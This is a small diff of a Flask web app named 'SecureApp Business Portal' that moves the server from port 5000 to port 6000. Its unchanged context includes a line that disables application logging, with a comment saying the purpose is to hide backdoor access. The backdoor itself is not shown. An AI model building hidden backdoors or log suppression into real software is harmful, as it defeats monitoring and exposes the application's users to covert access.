@@ -281,7 +281,7 @@ def not_found(error):
 
 if __name__ == '__main__':
     print("🚀 Starting SecureApp Business Portal...")
-    print("🌐 Server running on http://localhost:5000")
+    print("🌐 Server running on http://localhost:6000")
     print("📋 Available endpoints:")
     print("   - / (Home)")
     print("   - /about (About Us)")
@@ -294,4 +294,4 @@ if __name__ == '__main__':
     # Add hidden functionality logging
     app.logger.disabled = True  # Disable logging to hide backdoor access
 
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=6000, debug=False)
